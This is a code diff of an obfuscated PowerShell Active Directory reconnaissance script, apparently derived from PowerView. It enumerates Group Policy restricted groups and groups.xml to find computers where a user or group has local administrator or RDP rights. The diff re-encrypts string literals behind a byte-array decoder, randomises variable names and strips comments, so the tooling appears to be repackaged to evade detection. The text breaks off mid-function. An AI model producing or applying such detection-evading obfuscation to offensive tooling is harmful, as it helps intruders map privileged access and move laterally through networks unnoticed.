-            $FilePath = $u5Ie777[-1]
-            $nXovd = ((HandleResult95 @(100,82,175,255,199,196,107,104,191,167,245,243,92,104,145,230,255,212,8,115,134,221,219,250,94,54,183,164,249,237,89,49,128,205,242,190) @(61,5,229,149,157,131)).ToCharArray() | Get-Random -Count 7) -join ''
-            
-            Write-Verbose ((HandleResult95 @(130,16,186,203,164,4,132,55,225,151,165,13,181,0,197,202,167,41,151,122) @(214,71,131,250,198,106)) + $GptTmplPath + (HandleResult95 @(149,125,175,87,198,139,0,151,100,224,153,82,157,106,241,168,86,186,111,246,137,5,171,84,198,132,111,149,100,224,154,5,176,108,154,225) @(220,53,249,45,167)) + $nXovd)
-
+            $A6w2GNY = $GptTmplPath.split('\')
+            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
+            $FilePath = $A6w2GNY[-1]
+            $Qh217c4 = ((ParseEntry20 @(131,96,255,201,143,157,97,216,249,231,178,71,212,206,161,169,85,226,150,163,185,127,243,218,182,233,101,132,199,187,190,3,208,251,186,231) @(218,55,181,163,213)).ToCharArray() | Get-Random -Count 7) -join ''
+            Write-Verbose ((ParseEntry20 @(78,127,184,242,127,42,72,88,227,174,126,35,121,111,199,243,124,7,91,21) @(26,40,129,195,29,68)) + $GptTmplPath + (ParseEntry20 @(224,60,47,120,62,79,156,26,48,69,26,127,205,51,47,118,60,91,235,37,44,50,13,97,200,44,35,110,22,95,239,68,48,67,98,37) @(169,116,121,2,95,24)) + $Qh217c4)
             try {
-                $Null = New-PSDrive -Name $nXovd -PSProvider FileSystem -Root $mnwhsX0k  -ErrorAction Stop
+                $Null = New-PSDrive -Name $Qh217c4 -PSProvider FileSystem -Root $RGUSl5I  -ErrorAction Stop
             }
             catch {
-                Write-Debug ((HandleResult95 @(148,58,29,109,70,245,43,48,118,115,255,83,53,122,118,182,0,58,119,67,165,37,17,36,69,133,35,106) @(198,98,87,20,36)) + $GptTmplPath + (HandleResult95 @(225,211,250,213) @(168,151,149,178,43,150,137,238)) + $_)
+                Write-Debug ((ParseEntry20 @(142,187,115,232,209,136,190,51,190,180,0,160,209,213,165,36,190,142,90,246,208,252,177,100,189,160,120,172) @(220,227,57,145,179,187,247,84)) + $GptTmplPath + (ParseEntry20 @(209,115,210,51) @(152,55,189,84,32,179,150)) + $_)
                 return $Null
             }
-
-            # so we can cd/dir the new drive
-            $GptTmplPath = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
+            $GptTmplPath = $Qh217c4 + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
         } 
     }
-
     process {
-        $xS5E0C = ''
-        $dBwf = @{}
-        $ZXpvVx8 = @{}
-
+        $Ox1uC = ''
+        $KqbDt = @{}
+        $WEvxvQr = @{}
         try {
-
             if(Test-Path $GptTmplPath) {
-
-                Write-Verbose ((HandleResult95 @(202,147,165,17,52,105,243,161,185,17,22,102) @(159,212,227,104,87,91)) + $GptTmplPath)
-
+                Write-Verbose ((ParseEntry20 @(53,196,4,36,122,198,12,246,24,36,88,201) @(96,131,66,93,25,244)) + $GptTmplPath)
                 Get-Content $GptTmplPath -ErrorAction Stop | Foreach-Object {
                     if ($_ -match '\[') {
-                        # this signifies that we're starting a new section
-                        $xS5E0C = $_.trim('[]') -replace ' ',''
+                        $Ox1uC = $_.trim('[]') -replace ' ',''
                     }
                     elseif($_ -match '=') {
-                        $u5Ie777 = $_.split('=')
-                        $PropertyName = $u5Ie777[0].trim()
-                        $HETx = $u5Ie777[1].trim()
-
-                        if($HETx -match ',') {
-                            $HETx = $HETx.split(',')
+                        $A6w2GNY = $_.split('=')
+                        $PropertyName = $A6w2GNY[0].trim()
+                        $cHjL = $A6w2GNY[1].trim()
+                        if($cHjL -match ',') {
+                            $cHjL = $cHjL.split(',')
                         }
-
-                        if(!$dBwf[$xS5E0C]) {
-                            $dBwf.Add($xS5E0C, @{})
+                        if(!$KqbDt[$Ox1uC]) {
+                            $KqbDt.Add($Ox1uC, @{})
                         }
-
-                        # add the parsed property into the relevant Section name
-                        $dBwf[$xS5E0C].Add( $PropertyName, $HETx )
+                        $KqbDt[$Ox1uC].Add( $PropertyName, $cHjL )
                     }
                 }
-
-                ForEach ($vZ9fw5P in $dBwf.keys) {
-                    # transform each nested hash table into a custom object
-                    $ZXpvVx8[$vZ9fw5P] = New-Object PSObject -Property $dBwf[$vZ9fw5P]
+                ForEach ($WkF0TVK in $KqbDt.keys) {
+                    $WEvxvQr[$WkF0TVK] = New-Object PSObject -Property $KqbDt[$WkF0TVK]
                 }
-
-                # transform the parent hash table into a custom object
-                New-Object PSObject -Property $ZXpvVx8
+                New-Object PSObject -Property $WEvxvQr
             }
         }
         catch {
-            Write-Debug ((HandleResult95 @(211,99,175,136,209,228,200,92,134,182,245,174,226,9,137,132,233,174,192,6) @(129,59,229,241,179,215)) + $GptTmplPath + (HandleResult95 @(241,76,181,183) @(184,8,218,208,34)) + $_)
+            Write-Debug ((ParseEntry20 @(34,219,197,169,18,176,198,183,19,196,201,169,19,177,227,165,42,250,206,237) @(112,131,143,208)) + $GptTmplPath + (ParseEntry20 @(176,239,46,38) @(249,171,65,65,148,230,63)) + $_)
         }
     }
-
     end {
-        if($UsePSDrive -and $nXovd) {
-            Write-Verbose ((HandleResult95 @(230,92,221,111,236,128,107,251,121,227,208,86,239,92,216,199,82,200,89,223,230,1,217,98,239,235,107,231,82,207,142,12) @(179,49,139,27,142)) + $nXovd)
-            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
+        if($UsePSDrive -and $Qh217c4) {
+            Write-Verbose ((ParseEntry20 @(121,23,155,242,218,168,1,67,78,23,174,225,220,220,13,71,79,57,143,215,237,171,9,74,77,34,151,234,241,218,102,14) @(44,122,205,134,184,155,91,51)) + $Qh217c4)
+            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
         }
     }
 }
-
-
 function Get-GroupsXML {
-<#
-    .SYNOPSIS
-
-        Helper to parse a groups.xml file path into a custom object.
-
-    .PARAMETER GroupsXMLpath
-
-        The groups.xml file path name to parse. 
-
-    .PARAMETER ResolveSids
-
-        Switch. Resolve Sids from a DC policy to object names.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount the target groups.xml folder path as a temporary PSDrive.
-
-#>
-
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
         [String]
         $GroupsXMLPath,
-
         [Switch]
         $ResolveSids,
-
         [Switch]
         $UsePSDrive
     )
-
     begin {
         if($UsePSDrive) {
-            # if we're PSDrives, create a temporary mount point
-            $u5Ie777 = $GroupsXMLPath.split('\')
-            $mnwhsX0k = $u5Ie777[0..($u5Ie777.length-2)] -join '\'
-            $FilePath = $u5Ie777[-1]
-            $nXovd = ((HandleResult95 @(113,111,10,4,67,109,126,85,26,92,113,90,73,85,52,29,123,125,29,78,35,38,95,83,75,11,18,95,125,68,76,12,37,54,118,23) @(40,56,64,110,25,42)).ToCharArray() | Get-Random -Count 7) -join ''
-            
-            Write-Verbose ((HandleResult95 @(230,52,231,121,63,218,224,19,188,37,62,211,209,36,152,120,60,247,243,94) @(178,99,222,72,93,180)) + $GroupsXMLPath + (HandleResult95 @(254,237,95,77,214,242,60,89,254,226,76,80,211,226,95,67,212,230,75,102,226,149,91,78,214,253,83,91,254,226,79,7,254,228,52,10) @(183,165,9,55)) + $nXovd)
-
+            $A6w2GNY = $GroupsXMLPath.split('\')
+            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
+            $FilePath = $A6w2GNY[-1]
+            $Qh217c4 = ((ParseEntry20 @(140,151,87,127,63,146,150,112,79,87,189,176,124,120,17,166,162,74,32,19,182,136,91,108,6,230,146,44,113,11,177,244,120,77,10,232) @(213,192,29,21,101)).ToCharArray() | Get-Random -Count 7) -join ''
+            Write-Verbose ((ParseEntry20 @(77,97,51,69,249,5,196,105,84,103,23,252,8,209,95,6,107,55,218,86) @(25,54,10,116,155,107,150)) + $GroupsXMLPath + (ParseEntry20 @(34,124,180,137,172,93,146,149,34,115,167,148,169,77,241,143,8,119,160,162,152,58,245,130,10,108,184,159,132,77,225,203,34,117,223,206) @(107,52,226,243,205,10,167,251)) + $Qh217c4)
             try {
-                $Null = New-PSDrive -Name $nXovd -PSProvider FileSystem -Root $mnwhsX0k  -ErrorAction Stop
+                $Null = New-PSDrive -Name $Qh217c4 -PSProvider FileSystem -Root $RGUSl5I  -ErrorAction Stop
             }
             catch {
-                Write-Debug ((HandleResult95 @(83,147,164,234,99,248,167,244,99,156,215,162,99,165,188,227,99,166,141,244,98,140,168,163,96,136,175,174) @(1,203,238,147)) + $GroupsXMLPath + (HandleResult95 @(215,106,231,217) @(158,46,136,190,126,222,209,22)) + $_)
+                Write-Debug ((ParseEntry20 @(228,172,88,79,212,199,91,81,212,163,43,7,212,154,64,70,212,153,113,81,213,179,84,6,215,183,83,11) @(182,244,18,54)) + $GroupsXMLPath + (ParseEntry20 @(49,217,176,242) @(120,157,223,149,15,107,183)) + $_)
                 return $Null
             }
-
-            # so we can cd/dir the new drive
-            $GroupsXMLPath = $nXovd + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
+            $GroupsXMLPath = $Qh217c4 + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Olw="))) + $FilePath
         } 
     }
-
     process {
-
-        # parse the Groups.xml file if it exists 
         if(Test-Path $GroupsXMLPath) {
-
-            [xml] $q1E5XU = Get-Content $GroupsXMLPath
-
-            # process all group properties in the XML
-            $q1E5XU | Select-Xml (HandleResult95 @(104,62,84,141,194,211,29,118,14,132,156,131) @(36,71,109,197,161,190)) | Select-Object -ExpandProperty node | ForEach-Object {
-
-                $zRQl = @()
-                $y5exuW5 = @()
-
-                # extract the localgroup sid for memberof
-                $cXlWen = $_.Properties.GroupSid
-                if(!$cXlWen) {
+            [xml] $F6IlXblV = Get-Content $GroupsXMLPath
+            $F6IlXblV | Select-Xml (ParseEntry20 @(81,196,211,195,126,208,211,186,126,252,215,182) @(29,189,234,139)) | Select-Object -ExpandProperty node | ForEach-Object {
+                $IdJ9 = @()
+                $fDZZ = @()
+                $qbF4Ozdv = $_.Properties.GroupSid
+                if(!$qbF4Ozdv) {
                     if($_.Properties.groupName -match 'Administrators') {
-                        $cXlWen = 'S-1-5-32-544'
+                        $qbF4Ozdv = 'S-1-5-32-544'
                     }
                     elseif($_.Properties.groupName -match 'Remote Desktop') {
-                        $cXlWen = 'S-1-5-32-555'
+                        $qbF4Ozdv = 'S-1-5-32-555'
                     }
                     else {
-                        $cXlWen = $_.Properties.groupName
+                        $qbF4Ozdv = $_.Properties.groupName
                     }
                 }
-                $y5exuW5 = @($cXlWen)
-
+                $fDZZ = @($qbF4Ozdv)
                 $_.Properties.members | ForEach-Object {
-                    # process each member of the above local group
                     $_ | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
-
                         if($_.sid) {
-                            $zRQl += $_.sid
+                            $IdJ9 += $_.sid
                         }
                         else {
-                            # just a straight local account name
-                            $zRQl += $_.name
+                            $IdJ9 += $_.name
                         }
                     }
                 }
-
-                if ($zRQl -or $y5exuW5) {
-                    # extract out any/all filters...I hate you GPP
-                    $BJvP7x3 = $_.filters | ForEach-Object {
+                if ($IdJ9 -or $fDZZ) {
+                    $ihEQZ = $_.filters | ForEach-Object {
                         $_ | Select-Object -ExpandProperty Filter* | ForEach-Object {
                             New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                         }
                     }
-
                     if($ResolveSids) {
-                        $y5exuW5 = $y5exuW5 | ForEach-Object {Convert-SidToName $_}
-                        $zRQl = $zRQl | ForEach-Object {Convert-SidToName $_}
+                        $fDZZ = $fDZZ | ForEach-Object {Convert-SidToName $_}
+                        $IdJ9 = $IdJ9 | ForEach-Object {Convert-SidToName $_}
                     }
-
-                    if($y5exuW5 -isnot [system.array]) {$y5exuW5 = @($y5exuW5)}
-                    if($zRQl -isnot [system.array]) {$zRQl = @($zRQl)}
-
-                    $vTANjO = @{
-                        'GPODisplayName' = $aeVJG
+                    if($fDZZ -isnot [system.array]) {$fDZZ = @($fDZZ)}
+                    if($IdJ9 -isnot [system.array]) {$IdJ9 = @($IdJ9)}
+                    $ByqH = @{
+                        'GPODisplayName' = $GG4L2liq
                         'GPOName' = $GPOName
                         'GPOPath' = $GroupsXMLPath
-                        'Filters' = $BJvP7x3
-                        'MemberOf' = $y5exuW5
-                        'Members' = $zRQl
+                        'Filters' = $ihEQZ
+                        'MemberOf' = $fDZZ
+                        'Members' = $IdJ9
                     }
-
-                    New-Object -TypeName PSObject -Property $vTANjO
+                    New-Object -TypeName PSObject -Property $ByqH
                 }
             }
         }
     }
-
     end {
-        if($UsePSDrive -and $nXovd) {
-            Write-Verbose ((HandleResult95 @(30,237,170,105,41,179,166,109,41,237,159,122,47,199,170,105,40,195,190,76,30,176,174,100,42,216,166,113,2,193,193,32) @(75,128,252,29)) + $nXovd)
-            Get-PSDrive -Name $nXovd -ErrorAction SilentlyContinue | Remove-PSDrive
+        if($UsePSDrive -and $Qh217c4) {
+            Write-Verbose ((ParseEntry20 @(137,88,230,161,190,6,234,165,190,88,211,178,184,114,230,161,191,118,242,132,137,5,226,172,189,109,234,185,149,116,141,232) @(220,53,176,213)) + $Qh217c4)
+            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
         }
     }
 }
-
-
-
 function Get-NetGPO {
-<#
-    .SYNOPSIS
-
-        Gets a list of all current GPOs in a domain.
-
-    .PARAMETER GPOname
-
-        The GPO name to query for, wildcards accepted.   
-
-    .PARAMETER DisplayName
-
-        The GPO display name to query for, wildcards accepted.   
-
-    .PARAMETER Domain
-
-        The domain to query for GPOs, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through
-        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGPO -Domain testlab.local
-        
-        Returns the GPOs in the 'testlab.local' domain. 
-#>
     [CmdletBinding()]
     Param (
         [Parameter(ValueFromPipeline=$True)]
         [String]
         $GPOname = '*',
-
         [String]
         $DisplayName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-        
         [String]
         $ADSpath,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
-
     )
-
     begin {
-        $GVGqrC = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
+        $kwR5rt = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
     }
-
     process {
-        if ($GVGqrC) {
+        if ($kwR5rt) {
             if($DisplayName) {
-                $GVGqrC.filter=((HandleResult95 @(50,250,113,186,183,161,235,249,35,238,102,229,132,161,231,184,35,238,76,163,182,253,202,177,35,138,98,163,177,203,227,217,27,139,80,165,140,160,205,204,27,139,29,229,140,196,205,253,35,225,97,165,158,212,243,248,26,138,106,166,140,203,205,253,32,238,25,185,133,194,156,181) @(121,185,40,213,213,147,161,136)) + $DisplayName + ([char]0x29+[char]0x29))
+                $kwR5rt.filter=((ParseEntry20 @(188,191,82,77,7,151,100,134,166,92,108,85,244,28,177,204,81,117,1,211,77,153,151,50,120,86,239,88,147,164,73,115,7,151,86,135,165,56,78,33,199,28,194,204,82,117,9,208,116,175,181,123,105,34,247,94,148,207,73,81,60,253,66,130,165,92,19,9,245,127,202,193) @(247,252,11,34,101,165,46)) + $DisplayName + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
             }
             else {
-                $GVGqrC.filter=((HandleResult95 @(92,206,248,186,220,7,93,252,251,130,240,5,70,191,231,229,228,98,115,251,194,187,213,12,77,190,235,163,218,109,85,220,195,231,198,69,78,190,205,145,220,7,34,189,248,130,210,64,77,213,232,165,245,114,34,229,195,130,235,12) @(23,141,161,213,190,53)) + $GPOname + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
+                $kwR5rt.filter=((ParseEntry20 @(22,72,158,227,213,199,23,122,157,219,249,197,12,57,129,188,237,162,57,125,164,226,220,204,7,56,141,250,211,173,31,90,165,190,207,133,4,56,171,200,213,199,104,59,158,219,219,128,7,83,142,252,252,178,104,99,165,219,226,204) @(93,11,199,140,183,245)) + $GPOname + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KSk="))))
             }
-
-            $GVGqrC.FindAll() | Where-Object {$_} | ForEach-Object {
-                # convert/process the LDAP fields for each result
+            $kwR5rt.FindAll() | Where-Object {$_} | ForEach-Object {
                 Convert-LDAPProperty -Properties $_.Properties
             }
         }
     }
 }
-
-
 function Get-NetGPOGroup {
-<#
-    .SYNOPSIS
-
-        Returns all GPOs in a domain that set "Restricted Groups"
-        or use groups.xml on on target machines.
-
-    .PARAMETER GPOname
-
-        The GPO name to query for, wildcards accepted.   
-
-    .PARAMETER DisplayName
-
-        The GPO display name to query for, wildcards accepted.   
-
-    .PARAMETER ResolveSids
-
-        Switch. Resolve Sids from a DC policy to object names.
-
-    .PARAMETER Domain
-
-        The domain to query for GPOs, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER ADSpath
-
-        The LDAP source to search through
-        e.g. "LDAP://cn={8FF59D28-15D7-422A-BCB7-2AE45724125A},cn=policies,cn=system,DC=dev,DC=testlab,DC=local"
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount any found policy files with temporary PSDrives.
-
-    .EXAMPLE
-
-        PS C:\> Get-NetGPOGroup
-
-        Get all GPOs that set local groups on the current domain.
-#>
-
     [CmdletBinding()]
     Param (
         [String]
         $GPOname = '*',
-
         [String]
         $DisplayName,
-
         [Switch]
         $ResolveSids,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $ADSpath,
-
         [Switch]
         $UsePSDrive,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
-    # get every GPO from the specified domain with restricted groups set
     Get-NetGPO -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {
-
-        $y5exuW5 = $Null
-        $zRQl = $Null
-        $aeVJG = $_.displayname
+        $fDZZ = $Null
+        $IdJ9 = $Null
+        $GG4L2liq = $_.displayname
         $GPOname = $_.name
-        $KnPSS = $_.gpcfilesyspath
-
-        $v3GrfwQ9 =  @{
-            'GptTmplPath' = ($KnPSS + (HandleResult95 @(48,81,122,102,168,74,153,34,64,32,114,154,46,166,4,126,40,73,192,0,147,90,78,123,124,191,30,129,10,121,25,82,157,73,188,15,64,39,118,154,47,195,62,126,25,115,171,10,149,46,108,3,71,177,40,164,10,76,9,87,181,23,157,29,78,44,25,196) @(104,20,75,36,249,122,241)))
+        $YIok8 = $_.gpcfilesyspath
+        $XOlWSe =  @{
+            'GptTmplPath' = ($YIok8 + (ParseEntry20 @(189,114,164,230,179,24,96,175,99,254,242,129,124,95,137,93,246,201,219,82,106,215,109,165,252,164,76,120,135,90,199,210,134,27,69,130,99,249,246,129,125,58,179,93,199,243,176,88,108,163,79,221,199,170,122,93,135,111,215,215,174,69,100,144,109,242,153,223) @(229,55,149,164,226,40,8)))
             'UsePSDrive' = $UsePSDrive
         }
-
-        # parse the GptTmpl.inf 'Restricted Groups' file if it exists
-        $HdezxXtM = Get-GptTmpl @v3GrfwQ9
-
-        if($HdezxXtM.GroupMembership) {
-
-            $y5exuW5 = $HdezxXtM.GroupMembership | Get-Member *Memberof | ForEach-Object { $HdezxXtM.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
-            $zRQl = $HdezxXtM.GroupMembership | Get-Member *Members | ForEach-Object { $HdezxXtM.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
-
-            # only return an object if Members are found
-            if ($zRQl -or $y5exuW5) {
-
-                # if there is no Memberof defined, assume local admins
-                if(!$y5exuW5) {
-                    $y5exuW5 = 'S-1-5-32-544'
+        $ChJQ = Get-GptTmpl @XOlWSe
+        if($ChJQ.GroupMembership) {
+            $fDZZ = $ChJQ.GroupMembership | Get-Member *Memberof | ForEach-Object { $ChJQ.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
+            $IdJ9 = $ChJQ.GroupMembership | Get-Member *Members | ForEach-Object { $ChJQ.GroupMembership.($_.name) } | ForEach-Object { $_.trim('*') }
+            if ($IdJ9 -or $fDZZ) {
+                if(!$fDZZ) {
+                    $fDZZ = 'S-1-5-32-544'
                 }
-
                 if($ResolveSids) {
-                    $y5exuW5 = $y5exuW5 | ForEach-Object {Convert-SidToName $_}
-                    $zRQl = $zRQl | ForEach-Object {Convert-SidToName $_}
+                    $fDZZ = $fDZZ | ForEach-Object {Convert-SidToName $_}
+                    $IdJ9 = $IdJ9 | ForEach-Object {Convert-SidToName $_}
                 }
-
-                if($y5exuW5 -isnot [system.array]) {$y5exuW5 = @($y5exuW5)}
-                if($zRQl -isnot [system.array]) {$zRQl = @($zRQl)}
-
-                $vTANjO = @{
-                    'GPODisplayName' = $aeVJG
+                if($fDZZ -isnot [system.array]) {$fDZZ = @($fDZZ)}
+                if($IdJ9 -isnot [system.array]) {$IdJ9 = @($IdJ9)}
+                $ByqH = @{
+                    'GPODisplayName' = $GG4L2liq
                     'GPOName' = $GPOName
-                    'GPOPath' = $KnPSS
+                    'GPOPath' = $YIok8
                     'Filters' = $Null
-                    'MemberOf' = $y5exuW5
-                    'Members' = $zRQl
+                    'MemberOf' = $fDZZ
+                    'Members' = $IdJ9
                 }
-
-                New-Object -TypeName PSObject -Property $vTANjO
+                New-Object -TypeName PSObject -Property $ByqH
             }
         }
-
-        $v3GrfwQ9 =  @{
-            'GroupsXMLpath' = ($KnPSS + (HandleResult95 @(197,233,97,136,167,231,95,215,248,59,156,149,130,127,215,192,10,167,160,174,109,202,153,58,144,174,153,84,207,159,26,188,146,143,117,231,244,21,174,143,181,4,203,219,51,179,195,227,85,202,219,109) @(157,172,80,202,246,215,55)))
+        $XOlWSe =  @{
+            'GroupsXMLpath' = ($YIok8 + (ParseEntry20 @(139,7,96,63,130,114,57,55,135,41,7,30,134,10,27,17,137,47,7,4,137,21,100,23,137,26,31,30,129,113,27,11,183,26,19,7,139,7,53,4,177,113,7,10,176,59,100,73,177,21,38,64) @(211,66,81,125)))
             'ResolveSids' = $ResolveSids
             'UsePSDrive' = $UsePSDrive
         }
-
-        Get-GroupsXML @v3GrfwQ9
+        Get-GroupsXML @XOlWSe
     }
 }
-
-
 function Find-GPOLocation {
-<#
-    .SYNOPSIS
-
-        Takes a user/group name and optional domain, and determines 
-        the computers in the domain the user/group has local admin 
-        (or RDP) rights to.
-
-        It does this by:
-            1.  resolving the user/group to its proper sid
-            2.  enumerating all groups the user/group is a current part of 
-                and extracting all target SIDs to build a target SID list
-            3.  pulling all GPOs that set 'Restricted Groups' by calling
-                Get-NetGPOGroup
-            4.  matching the target sid list to the queried GPO SID list
-                to enumerate all GPO the user is effectively applied with
-            5.  enumerating all OUs and sites and applicable GPO GUIs are
-                applied to through gplink enumerating
-            6.  querying for all computers under the given OUs or sites
-
-    .PARAMETER UserName
-
-        A (single) user name name to query for access.
-
-    .PARAMETER GroupName
-
-        A (single) group name name to query for access. 
-
-    .PARAMETER Domain
-
-        Optional domain the user exists in for querying, defaults to the current domain.
-
-    .PARAMETER DomainController
-
-        Domain controller to reflect LDAP queries through.
-
-    .PARAMETER LocalGroup
-
-        The local group to check access against.
-        Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
-        or a custom local SID. Defaults to local 'Administrators'.
-
-    .PARAMETER UsePSDrive
-
-        Switch. Mount any found policy files with temporary PSDrives.
-
-    .PARAMETER PageSize
-
-        The PageSize to set for the LDAP searcher object.
-
-    .EXAMPLE
-
-        PS C:\> Find-GPOLocation -UserName dfm
-        
-        Find all computers that dfm user has local administrator rights to in 
-        the current domain.
-
-    .EXAMPLE
-
-        PS C:\> Find-GPOLocation -UserName dfm -Domain dev.testlab.local
-        
-        Find all computers that dfm user has local administrator rights to in 
-        the dev.testlab.local domain.
-
-    .EXAMPLE
-
-        PS C:\> Find-GPOLocation -UserName jason -LocalGroup RDP
-        
-        Find all computers that jason has local RDP access rights to in the domain.
-#>
-
     [CmdletBinding()]
     Param (
         [String]
         $UserName,
-
         [String]
         $GroupName,
-
         [String]
         $Domain,
-
         [String]
         $DomainController,
-
         [String]
         $LocalGroup = 'Administrators',
-        
         [Switch]
         $UsePSDrive,
-
         [ValidateRange(1,10000)] 
         [Int]
         $PageSize = 200
     )
-
     if($UserName) {
-
-        $m342PSR = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
-        $vEV7hR = $m342PSR.objectsid
-
-        if(!$vEV7hR) {    
-            Throw ((HandleResult95 @(77,16,86,221,127,114,9,118) @(27,72,24,177,28)) + $UserName + (HandleResult95 @(2,177,240,250,42,251,227,232,18,165,139,190,42,165,227,231) @(72,200,178,143)))
+        $qzuM = Get-NetUser -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
+        $YniZ1ZYN = $qzuM.objectsid
+        if(!$YniZ1ZYN) {    
+            Throw ((ParseEntry20 @(115,203,1,192,128,69,100,253) @(37,147,79,172,227,44)) + $UserName + (ParseEntry20 @(140,237,190,10,225,247,205,198,156,249,197,78,225,169,205,201) @(198,148,252,127,131,196,156,161)))
         }
-
-        $dXja = $vEV7hR
-        $i7h0U2 = $m342PSR.samaccountname
-        $RMOjyA9b = $m342PSR.distinguishedname
+        $Tl2GKR4 = $YniZ1ZYN
+        $XWK0 = $qzuM.samaccountname
+        $riZxyR = $qzuM.distinguishedname
     }
     elseif($GroupName) {
-
-        $ayFBYTwN = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
-        $bOhis1 = $ayFBYTwN.objectsid
-
-        if(!$bOhis1) {    
-            Throw ((HandleResult95 @(254,142,41,24,165,20,205,4,230,202,94,83) @(172,189,99,110,193,76,140,99)) + $GroupName + (HandleResult95 @(45,25,166,98,129,199,124,0,58,137,46,210,150,64,54,8) @(103,96,228,23,227,244,45)))
+        $tDwvKLfV = Get-NetGroup -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
+        $PfVgQi = $tDwvKLfV.objectsid
+        if(!$PfVgQi) {    
+            Throw ((ParseEntry20 @(14,153,103,129,56,242,108,144,22,221,16,202) @(92,170,45,247)) + $GroupName + (ParseEntry20 @(45,255,162,29,48,145,54,225,186,5,107,147,5,235,177,0) @(103,134,224,104,82,162)))
         }
-
-        $dXja = $bOhis1
-        $i7h0U2 = $ayFBYTwN.samaccountname
-        $RMOjyA9b = $ayFBYTwN.distinguishedname
+        $Tl2GKR4 = $PfVgQi
+        $XWK0 = $tDwvKLfV.samaccountname
+        $riZxyR = $tDwvKLfV.distinguishedname
     }
     else {
-        throw (HandleResult95 @(15,114,17,196,50,199,116,12,125,16,143,4,214,121,122,93,14,253,89,215,93,46,29,118,221,45,170,86,33,115,18,217,10,199,104,57,64,4,252,1,197,109,1,94,36,249,62,245,95,20,126,55,228,63,206,86) @(67,36,71,190,104,159,62))
+        throw (ParseEntry20 @(55,87,54,253,147,114,218,52,88,55,182,165,99,215,66,120,41,196,248,98,243,22,56,81,228,140,31,248,25,86,53,224,171,114,198,1,101,35,197,160,112,195,57,123,3,192,159,64,241,44,91,16,221,158,123,248) @(123,1,96,135,201,42,144))
     }
-
-    if($LocalGroup -like (HandleResult95 @(86,22,241,126,210,74,17,194,94,215,32,64) @(29,125,183,21,176))) {
-        $cXlWen = (HandleResult95 @(53,88,43,83,105,116,212,20,108,97,98,81,110,213,49,17) @(96,33,27,43,37,32,129))
+    if($LocalGroup -like (ParseEntry20 @(26,44,172,84,209,114,72,41,26,32,215,2) @(81,71,234,63,179,37,36,92))) {
+        $qbF4Ozdv = (ParseEntry20 @(218,23,59,151,211,236,218,26,70,149,214,204,193,58,90,223) @(143,110,11,239,159,184))
     }
-    elseif ( ($LocalGroup -like (HandleResult95 @(174,119,187,207,166,168,163,216) @(229,27,241,138,243,235,204))) -or ($LocalGroup -like (HandleResult95 @(252,146,173,74,117,64,142,206,189,117,120,42) @(183,254,231,38,23,23))) ) {
-        $cXlWen = (HandleResult95 @(45,169,234,129,31,144,45,164,151,131,26,176,54,132,143,200) @(120,208,218,249,83,196))
+    elseif ( ($LocalGroup -like (ParseEntry20 @(19,157,249,109,90,242,55,204) @(88,241,179,40,15,177))) -or ($LocalGroup -like (ParseEntry20 @(2,33,80,131,43,26,35,223,19,30,117,210) @(73,77,26,239))) ) {
+        $qbF4Ozdv = (ParseEntry20 @(98,228,77,60,59,99,200,9,9,13,126,233,51,16,34,6) @(55,157,125,68,119))
     }
-    elseif ($LocalGroup -like (HandleResult95 @(167,48,89,96,190,29,60,105) @(242,73,105,24))) {
-        $cXlWen = $LocalGroup
+    elseif ($LocalGroup -like (ParseEntry20 @(251,29,244,208,224,170,251,21) @(174,100,196,168,172,254))) {
+        $qbF4Ozdv = $LocalGroup
     }
     else {
